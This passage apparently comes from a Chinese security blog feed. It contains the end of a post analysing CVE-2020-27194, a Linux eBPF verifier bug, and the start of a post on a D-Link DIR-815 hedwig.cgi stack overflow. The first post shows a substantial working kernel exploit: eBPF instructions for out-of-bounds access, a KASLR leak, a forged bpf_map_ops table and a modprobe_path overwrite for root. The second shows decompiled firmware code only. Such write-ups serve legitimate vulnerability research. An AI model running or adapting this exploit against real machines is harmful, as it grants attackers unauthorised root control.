BPF_LD_MAP_FD(<span class="number">9</span>,<span class="number">3</span>),             <span class="comment">//r9 = ctrl_map_fd</span></span><br><span class="line">    BPF_MAP_GET(<span class="number">0</span>,<span class="number">5</span>),               <span class="comment">//r5 = ctrl_map_fd[0], r0 = &amp;ctrl_map</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_JMP32_IMM(BPF_JLE, <span class="number">5</span>, <span class="number">0x7fffffff</span>, <span class="number">1</span>),  <span class="comment">//if r5 &gt; 0:jmp pc+1</span></span><br><span class="line">    BPF_EXIT_INSN(),				<span class="comment">//r5-&gt;min_val = 1</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JGT, <span class="number">5</span>, <span class="number">0</span>, <span class="number">1</span>),  <span class="comment">//if r5 &gt; 0:jmp pc+1</span></span><br><span class="line">    BPF_EXIT_INSN(),				<span class="comment">//r5-&gt;min_val = 1</span></span><br><span class="line">    </span><br><span class="line">	BPF_LD_IMM64(<span class="number">6</span>, <span class="number">0x600000002</span>),	<span class="comment">//r6 = 0x600000002</span></span><br><span class="line">	BPF_JMP_REG(BPF_JLT, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>),	<span class="comment">//if r5 &lt; r:jmp pc+1</span></span><br><span class="line">	BPF_EXIT_INSN(),				<span class="comment">//r5-&gt;max_val = 0x100000001</span></span><br><span class="line"></span><br><span class="line">	BPF_ALU64_IMM(BPF_OR, <span class="number">5</span>, <span class="number">0</span>),	<span class="comment">//r5 |= 0</span></span><br><span class="line">	BPF_MOV32_REG(<span class="number">6</span>, <span class="number">5</span>),			<span class="comment">//r6_32 = r5_32</span></span><br><span class="line">	BPF_ALU64_IMM(BPF_RSH, <span class="number">6</span>, <span class="number">1</span>),	<span class="comment">//r6 &gt;&gt;= 1</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MUL,<span class="number">6</span>,<span class="number">0x110</span>), <span class="comment">//r6 *= 0x110</span></span><br><span class="line"></span><br><span class="line">    BPF_LD_MAP_FD(<span class="number">9</span>,<span class="number">4</span>),      <span class="comment">//r9 = exp_map_fd</span></span><br><span class="line">    BPF_MAP_GET_ADDR(<span class="number">0</span>,<span class="number">7</span>),          <span class="comment">//r7 = &amp;exp_map</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_ALU64_REG(BPF_SUB,<span class="number">7</span>,<span class="number">6</span>),     <span class="comment">//r7 -= r6</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    BPF_LD_MAP_FD(<span class="number">9</span>,<span class="number">3</span>),             <span class="comment">//r9 = ctrl_map_fd</span></span><br><span class="line">    BPF_MAP_GET_ADDR(<span class="number">0</span>,<span class="number">6</span>),          <span class="comment">//r6 = %ctrl_map</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV,<span class="number">0</span>,<span class="number">1</span>),</span><br><span class="line">    BPF_LDX_MEM(BPF_DW,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>),      <span class="comment">//r0 = [r7+0]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x10</span>),   <span class="comment">//r6+0x10 = r0 = ctrl_map[2]</span></span><br><span class="line">    BPF_LDX_MEM(BPF_DW,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0xc0</span>),   <span class="comment">//r0 = [r7+0xc0]</span></span><br><span class="line">    BPF_STX_MEM(BPF_DW,<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x18</span>),   <span class="comment">//r6+0x18 = r0 = ctrl_map[3]</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_ADD,<span class="number">0</span>,<span class="number">0x50</span>),  <span class="comment">//r0 += 0x50 =&gt; element_addr</span></span><br><span class="line">    </span><br><span class="line">    BPF_LDX_MEM(BPF_DW,<span class="number">8</span>,<span class="number">6</span>,<span class="number">8</span>),      <span class="comment">//r8 = [r6+8] = ctrl_map[1]</span></span><br><span class="line">    BPF_JMP_IMM(BPF_JNE,<span class="number">8</span>,<span class="number">0x2</span>,<span class="number">4</span>),</span><br><span class="line"></span><br><span class="line">    <span class="comment">//arb write</span></span><br><span class="line"></span><br><span class="line">    BPF_STX_MEM(BPF_DW,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>),      <span class="comment">//[r7] = [ops] = r0 = element_addr</span></span><br><span class="line">    BPF_ST_MEM(BPF_W,<span class="number">7</span>,<span class="number">0x18</span>,BPF_MAP_TYPE_STACK),<span class="comment">//[ops+0x18] = BPF_MAP_TYPE_STACK</span></span><br><span class="line">    BPF_ST_MEM(BPF_W,<span class="number">7</span>,<span class="number">0x24</span>,<span class="number">-1</span>),   <span class="comment">//max_entries</span></span><br><span class="line">    BPF_ST_MEM(BPF_W,<span class="number">7</span>,<span class="number">0x2c</span>,<span class="number">0</span>),    <span class="comment">//locak_off</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//exit</span></span><br><span class="line">    BPF_ALU64_IMM(BPF_MOV,<span class="number">0</span>,<span class="number">0</span>),     <span class="comment">//</span></span><br><span class="line">    BPF_EXIT_INSN(),</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">prep</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ctrlmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,<span class="keyword">sizeof</span>(<span class="keyword">int</span>),<span class="number">0x100</span>,<span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">if</span>(ctrlmapfd&lt;<span class="number">0</span>)&#123; __exit(strerror(errno));&#125;</span><br><span class="line">    expmapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY,<span class="keyword">sizeof</span>(<span class="keyword">int</span>),<span class="number">0x2000</span>,<span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">if</span>(expmapfd&lt;<span class="number">0</span>)&#123; __exit(strerror(errno));&#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"ctrlmapfd: %d,  expmapfd: %d \n"</span>,ctrlmapfd,expmapfd);</span><br><span class="line"></span><br><span class="line">    progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            insns, <span class="keyword">sizeof</span>(insns), <span class="string">"GPL"</span>, <span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(progfd &lt; <span class="number">0</span>)&#123; __exit(strerror(errno));&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, sockets))&#123;</span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;progfd, <span class="keyword">sizeof</span>(progfd)) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">        __exit(strerror(errno));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"pwning...\n"</span>);</span><br><span class="line">    <span class="keyword">uint32_t</span> key = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">char</span> *ctrlbuf = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">char</span> *expbuf  = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span> *ctrlbuf64 = (<span class="keyword">uint64_t</span> *)ctrlbuf;</span><br><span class="line">    <span class="keyword">uint64_t</span> *expbuf64  = (<span class="keyword">uint64_t</span> *)expbuf;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(ctrlbuf,<span class="string">'A'</span>,<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">8</span>;i++)&#123;</span><br><span class="line">        expbuf64[i] = i+<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctrlbuf64[<span class="number">0</span>]=<span class="number">2</span>;</span><br><span class="line">    ctrlbuf64[<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    bpf_update_elem(ctrlmapfd,&amp;key,ctrlbuf,<span class="number">0</span>);</span><br><span class="line">    bpf_update_elem(expmapfd,&amp;key,expbuf,<span class="number">0</span>);</span><br><span class="line">    writemsg();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak</span></span><br><span class="line">    <span class="built_in">memset</span>(ctrlbuf,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    bpf_lookup_elem(ctrlmapfd,&amp;key,ctrlbuf);</span><br><span class="line">    x64dump(ctrlbuf,<span class="number">8</span>);</span><br><span class="line">    bpf_lookup_elem(expmapfd,&amp;key,expbuf);</span><br><span class="line">    x64dump(expbuf,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> map_leak = ctrlbuf64[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> elem_leak = ctrlbuf64[<span class="number">3</span>]<span class="number">-0xc0</span>+<span class="number">0x110</span>;</span><br><span class="line">    <span class="comment">//uint64_t kaslr = map_leak - 0xffffffff82016340;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> kaslr = map_leak - <span class="number">0xffffffff820488c0</span>;</span><br><span class="line">    loglx(<span class="string">"map_leak"</span>,map_leak);</span><br><span class="line">    loglx(<span class="string">"elem_leak"</span>,elem_leak);</span><br><span class="line">    loglx(<span class="string">"kaslr"</span>,kaslr);</span><br><span class="line">    <span class="comment">//loglx("modprobe",modprobe_path);</span></span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">uint64_t</span> fake_map_ops[]=&#123;</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9d70</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fae80</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fa5e0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9e60</span>, <span class="comment">//get net key 5</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811dee60</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811dec20</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9f20</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fa4c0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9ea0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9e60</span>, <span class="comment">//map_push_elem 15</span></span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fa210</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fa030</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811fac70</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        <span class="number">0x0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9df0</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9e20</span>,</span><br><span class="line">        kaslr + <span class="number">0xffffffff811f9fc0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// overwrite bpf_map_ops</span></span><br><span class="line">    <span class="built_in">memcpy</span>(expbuf,(<span class="keyword">void</span> *)fake_map_ops,<span class="keyword">sizeof</span>(fake_map_ops));</span><br><span class="line">    bpf_update_elem(expmapfd,&amp;key,expbuf,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//overwrite fake ops</span></span><br><span class="line">    ctrlbuf64[<span class="number">0</span>]=<span class="number">0x2</span>;</span><br><span class="line">    ctrlbuf64[<span class="number">1</span>]=<span class="number">0x2</span>;</span><br><span class="line">    bpf_update_elem(ctrlmapfd,&amp;key,ctrlbuf,<span class="number">0</span>);</span><br><span class="line">    bpf_update_elem(expmapfd,&amp;key,expbuf,<span class="number">0</span>);</span><br><span class="line">    writemsg();</span><br><span class="line">    <span class="keyword">uint64_t</span> modprobe_path = <span class="number">0xFFFFFFFF826613C0</span>+kaslr;</span><br><span class="line">    expbuf64[<span class="number">0</span>] = <span class="number">0x5f796d2f</span> - <span class="number">1</span>;</span><br><span class="line">    bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path);</span><br><span class="line">    expbuf64[<span class="number">0</span>] = <span class="number">0x00707865</span> - <span class="number">1</span>;</span><br><span class="line">    bpf_update_elem(expmapfd,&amp;key,expbuf,modprobe_path+<span class="number">4</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    prep();</span><br><span class="line">    pwn();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __exit(<span class="keyword">char</span> *err) &#123;              </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"error: %s\n"</span>, err); </span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);                            </span><br><span class="line">&#125;                                            </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">writemsg</span><span class="params">(<span class="keyword">void</span>)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">	<span class="keyword">ssize_t</span> n = write(sockets[<span class="number">0</span>], buffer, <span class="keyword">sizeof</span>(buffer));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (n &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		perror(<span class="string">"write"</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (n != <span class="keyword">sizeof</span>(buffer))</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"short write: %lu\n"</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_prog_load</span><span class="params">(<span class="keyword">enum</span> bpf_prog_type prog_type,         </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> struct bpf_insn *insns, <span class="keyword">int</span> prog_len,  </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">const</span> <span class="keyword">char</span> *license, <span class="keyword">int</span> kern_version)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;                                        </span><br><span class="line">        .prog_type = prog_type,                                </span><br><span class="line">        .insns = (<span class="keyword">uint64_t</span>)insns,                              </span><br><span class="line">        .insn_cnt = prog_len / <span class="keyword">sizeof</span>(struct bpf_insn),        </span><br><span class="line">        .license = (<span class="keyword">uint64_t</span>)license,                          </span><br><span class="line">        .log_buf = (<span class="keyword">uint64_t</span>)bpf_log_buf,                      </span><br><span class="line">        .log_size = LOG_BUF_SIZE,                              </span><br><span class="line">        .log_level = <span class="number">1</span>,                                        </span><br><span class="line">    &#125;;                                                             </span><br><span class="line">    attr.kern_version = kern_version;                              </span><br><span class="line">    bpf_log_buf[<span class="number">0</span>] = <span class="number">0</span>;                                            </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_PROG_LOAD, &amp;attr, <span class="keyword">sizeof</span>(attr));  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_create_map</span><span class="params">(<span class="keyword">enum</span> bpf_map_type map_type, <span class="keyword">int</span> key_size, <span class="keyword">int</span> value_size,  </span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">int</span> max_entries)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;                                         </span><br><span class="line">        .map_type = map_type,                                   </span><br><span class="line">        .key_size = key_size,                                   </span><br><span class="line">        .value_size = value_size,                               </span><br><span class="line">        .max_entries = max_entries                              </span><br><span class="line">    &#125;;                                                              </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_CREATE, &amp;attr, <span class="keyword">sizeof</span>(attr));  </span><br><span class="line"></span><br><span class="line">&#125;                                                </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_update_elem</span><span class="params">(<span class="keyword">int</span> fd ,<span class="keyword">void</span> *key, <span class="keyword">void</span> *value,<span class="keyword">uint64_t</span> flags)</span></span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;                                              </span><br><span class="line">        .map_fd = fd,                                                </span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>)key,                                        </span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>)value,                                    </span><br><span class="line">        .flags = flags,                                              </span><br><span class="line">    &#125;;                                                                   </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));  </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">bpf_lookup_elem</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">void</span> *key, <span class="keyword">void</span> *value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">union</span> bpf_attr attr = &#123;                                              </span><br><span class="line">        .map_fd = fd,                                                </span><br><span class="line">        .key = (<span class="keyword">uint64_t</span>)key,                                        </span><br><span class="line">        .value = (<span class="keyword">uint64_t</span>)value,                                    </span><br><span class="line">    &#125;;                                                                   </span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;attr, <span class="keyword">sizeof</span>(attr));  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>利用效果如下。</p>
<p><img src="/2020/12/14/CVE-2020-27194/6.png" alt></p>
<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>在提交本文之后我参考<code>de4dcr0w</code>师傅的文章写了get root shell的exp，原理在师傅的文章中已经阐释地非常清晰，这里需要注意几点：</p>
<ol>
<li>因为我是编译的带符号的内核，因此前面的几个关键地址可以通过符号表直接得到，对于无符号的内核需要爆破得到地址。在构造任意读爆破的过程中有些地址空间没有分配会直接crash掉(或者有读保护)，每次crash需要手动调整起始地址，这样大约十次左右可以得到目标地址</li>
<li>在exp的编写中有很多结构体成员的偏移需要手动寻找，最好找的方式是在gdb中查找，如果找不到相关的结构体需要看源码里是否define了宏，是否有函数将此类型的变量作为参数，再到IDA里对应函数处查看参数类型，<code>local types</code>里可以清楚地看到成员的名字和偏移</li>
</ol>
<p><img src="/2020/12/14/CVE-2020-27194/7.png" alt></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/203416" target="_blank" rel="noopener">CVE-2020-8835 pwn2own 2020 ebpf 提权漏洞分析</a></p>
<p><a href="https://xz.aliyun.com/t/7690" target="_blank" rel="noopener">CVE-2020-8835 pwn2own 2020 ebpf 通过任意读写提权分析</a></p>
<p><a href="https://www.anquanke.com/post/id/204319#h3-10" target="_blank" rel="noopener">Kernel Pwn 学习之路 - 番外</a></p>
]]></content>
  </entry>
  <entry>
    <title>D-LINK-DIR815_stack_overflow</title>
    <url>/2020/12/19/D-LINK-DIR815-stack-overflow/</url>
    <content><![CDATA[<h1 id="D-LINK-DIR815栈溢出分析"><a href="#D-LINK-DIR815栈溢出分析" class="headerlink" title="D-LINK-DIR815栈溢出分析"></a>D-LINK-DIR815栈溢出分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>D-LINK DIR645/DIR815都存在的一个洞，这里选择815的固件进行分析。</p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>下载固件，binwalk解压，定位到hedwig.cgi，发现是个符号链接指向cgibin，把该文件拷出分析。</p>
<p>main函数根据启动时的参数确定，形如<code>./cgibin /hedwig.cgi</code>的启动方式对应进入hedwigcgi_main的处理逻辑。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// $s0</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// $v0</span></span><br><span class="line">  <span class="keyword">int</span> (*v8)(); <span class="comment">// $t9</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// $a0</span></span><br><span class="line"></span><br><span class="line">  v3 = *argv;</span><br><span class="line">  v6 = <span class="built_in">strrchr</span>(*argv, <span class="number">47</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v6 )</span><br><span class="line">    v3 = v6 + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"phpcgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = phpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"dlcfg.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = dlcfg_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(<span class="keyword">int</span>, <span class="keyword">const</span> <span class="keyword">char</span> **, <span class="keyword">const</span> <span class="keyword">char</span> **))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"seama.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = seamacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"fwup.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = fwup_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"fwupdater"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())fwupdater_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"session.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;sessioncgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"captcha.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;captchacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"hedwig.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = hedwigcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"pigwidgeon.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;pigwidgeoncgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"service.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;servicecgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"ssdpcgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = ssdpcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"soap.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = soapcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"gena.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = genacgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"conntrack.cgi"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;conntrackcgi_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(v3, <span class="string">"hnap"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = (<span class="keyword">int</span> (*)())&amp;hnap_main;</span><br><span class="line">    v9 = argc;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span> (__fastcall *)(_DWORD, _DWORD, _DWORD))v8)(v9, argv, envp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"CGI.BIN, unknown command %s\n"</span>, v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>hedwigcgi_main是漏洞存在的函数，其获取数据的方式基本都是通过getenv从环境变量中获取，比如<code>REQUEST_METHOD</code>这个字段，这点和我们之前遇到的httpd通过http请求不同。</p>
